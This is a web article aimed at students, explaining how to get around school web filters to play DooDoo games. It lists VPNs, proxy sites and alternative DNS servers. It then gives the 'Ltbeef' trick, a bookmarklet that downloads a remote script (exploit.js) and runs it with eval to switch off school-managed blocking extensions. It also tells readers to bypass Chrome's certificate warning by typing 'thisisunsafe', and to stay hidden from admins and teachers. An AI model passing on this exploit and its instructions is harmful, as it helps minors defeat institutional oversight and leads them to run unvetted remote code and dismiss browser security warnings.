@@ -1,0 +1,89 @@
+How to Unblock DooDoo Games Walk-through
+
+Unfortunately blocked at school? Looking for some methods to unblock DooDoo games at school? This article will take you walking through some mainstream unlocking methods.
+1. Virtual Private Network (VPN)
+
+VPNs are by far the most widely used method for unblocking websites. However, circumventing blocks is only a byproduct of their functionality.
+
+A virtual private network, as the name implies, reroutes your traffic through its own secure servers, essentially extending the private network of your home, school, or workplace into a virtual public network. In other words, instead of sending your traffic straight to a website, a VPN acts as a "middleman" who takes your data and resends it.
+
+However, the number of servers and their capabilities varies greatly amongst VPN companies. Even a fast search for a VPN can turn up hundreds of different providers, each with a distinct number and range of servers.
+
+Price varies with performance, as you might expect, with top providers asking $10 or more per month to utilize networks with hundreds of secure VPN servers. While there are some free VPNs available, they are sometimes inadequate – and many people resort to proxies for free unblocking.
+
+Some of these vpns come as full-fledged software tools or browser extensions.
+
+X-VPN, Browsec VPN, Free VPN, Secure VPN, etc. There is a lot of choice, but no matter which one you choose, we hope it is helpful sincerely.
+2. Proxy
+
+A proxy, like a VPN, reroutes data through its own servers, but with a few important variations.
+
+The main distinction is that proxies do not encrypt data as VPNs do. As a result, third parties may see all of your traffic.
+
+In addition, most proxies have significantly fewer servers than the average VPN service. While you may still be able to unblock websites, it is unlikely that they will be as reliable as utilizing a VPN.
+
+However, these disadvantages do not rule out the use of proxies. Proxies provide a rapid solution to unblock websites while maintaining privacy because they are free and readily available.
+
+Some of them come as independent sites or browser extensions.
+
+Here are some you may give it a try. Simply open the webpage and type doodoo.love or https://doodoo.love into the textbox and go:
+
+    https://googlemath.net/uv.html
+    https://analystinn.net/1.html
+    https://googleclassroom.titannetwork.info/
+    https://womginx.arph.org/
+    https://southsmp.org/main.html
+
+If some of them are blocked, try some others. And if you don't know how to use them in detail, we will show you guys step by step in subsequent articles.
+3. Change Your DNS Server
+
+Switching to a different Domain Name System (DNS) server is an effective way to unblock websites if you’ve been IP banned.
+
+Without getting too technical, your DNS server is responsible for linking URLs to their IP address(es) (e.g., google.com to 172.217.204.102). Since private networks and ISPs manage blocks from their DNS servers, switching to a public one is usually a good workaround.
+
+You may change DNS servers by typing their IP addresses into your computer's network settings. Google's public DNS server, with the IP address 8.8.8.8, is one of the most popular (and easy-to-remember) options.
+
+And here are some of them that you may give it a try:
+
+    72.5.33.65
+    129.213.138.223
+    198.98.53.76
+
+4. [Tricks]Stop Block Extensions with Ltbeef
+
+Some schools use some browser extension based tools to block websites, like GoGuardian, Securly, etc.
+
+Now, we have found a method to get you to stop them and unblock your browser step by step.
+First: Add a bookmark
+
+The name you can type whatever you want, and fill in the URL with the code below:
+
+javascript:fetch("https://compactcow.com/ltbeef/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});
+Second: Click to open the extensions' op page
+
+Enter a webpage that you can visit on your computer, notice not the newtab page.
+
+And then click the bookmark you added just now. You'll see google 404 page. Don't worry, that's right. (But if you can't see this page, you may need to follow the Fourth step.)
+
+Now give it the second click, and you'll see the extensions op page like this.
+Third: Close all the blocking extensions
+
+Find out all the blocking extensions and kick them off. After that, you are free to play DooDoo games.
+Fourth: Change DNS and try again
+
+If you face some problem in the second step, this may provide some help.
+
+Set the DNS like this and visit chrome://restart to restart chrome browser. After that, visit https://chrome.google.com and you may see a warning page like this.
+
+Don't worry, once here click the warning symbol and type in thisisunsafe.
+
+Now everything is normal!
+
+We hope this article will help you.
+
+If you did it, don't forget to share it with friends.
+
+Most important, pay attention to the system admin and teachers!!!
+5. Other Tricks
+
+In addition, you may also know that some other tricks can be effective, and we hope that you can also share this happiness with your friends.
